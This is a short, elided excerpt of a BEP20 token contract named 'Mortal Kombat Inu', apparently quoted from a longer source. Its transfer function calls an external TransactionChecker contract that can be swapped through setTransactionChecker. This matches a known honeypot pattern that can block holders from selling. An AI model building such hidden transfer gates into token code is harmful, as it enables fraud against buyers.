...
contract MortalKombatInu is IBEP20 {

    address public owner = msg.sender;

    string public name = "Mortal Kombat Inut";
    string public symbol = "WHAINU"; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        TransactionChecker(txval).validate(sender, recipient);
    ...
    function setTransactionChecker(address txAddress) public {
